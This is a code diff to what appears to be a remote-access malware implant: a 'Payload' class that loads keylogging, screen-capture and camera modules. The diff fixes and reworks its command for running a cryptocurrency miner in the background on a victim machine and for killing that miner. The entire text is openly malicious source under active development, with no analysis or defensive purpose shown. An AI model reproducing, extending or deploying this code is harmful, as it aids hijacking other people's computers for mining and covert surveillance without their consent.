@@ -98,6 +98,7 @@ class Payload():
 
         """
         self.handlers = {}
+        self.child_procs = {}
         self.remote = {'modules': [], 'packages': ['cv2','requests','pyHook','pyxhook','twilio','mss']}
         self.gui = True if kwargs.get('gui') else False
         self.owner = kwargs.get('owner')
@@ -550,10 +551,9 @@ class Payload():
         
         args = str(args).split()
 
-        if len(args) == 4:
-            cmd, url, username, password  = args
-
-            if cmd == 'run':
+        if 'run' in args:
+            if len(args) == 4:
+                cmd, url, username, password  = args
                 try:
                     # run miner (module forks and returns PID of child process)
                     pid = globals()['miner'].run(url, username, password)
@@ -566,19 +566,18 @@ class Payload():
                     return """Miner running in background\nPID: {0}""".format(pid)
                 except Exception as e:
                     return "{} error: {}".format(self.miner.__name__, str(e))
+            return "usage: miner run [url] [user] [pass]"
 
-        elif len(args) == 1:
-            cmd = args[0]
-
-            if cmd == 'stop':
-                if 'miner' in self.chid_procs and len(self.child_procs['miner']):
-                    for pid in self.child_procs['miner']:
-                        try:
-                            os.kill(pid, signal.SIGSTOP)
-                        except OSError as e:
-                            log("{} error: {}".format(self.miner.__name__, str(e)))
-                else:
-                    return "Miner is not running."
+        elif 'stop' in args:
+            if 'miner' in self.child_procs and len(self.child_procs['miner']):
+                for pid in self.child_procs['miner']:
+                    try:
+                        os.kill(pid, signal.SIGKILL)
+                    except OSError as e:
+                        log("{} error: {}".format(self.miner.__name__, str(e)))
+                return "Miner stopped."
+            else:
+                return "Miner is not running."
 
         return "usage: {}".format(self.miner.usage)
 
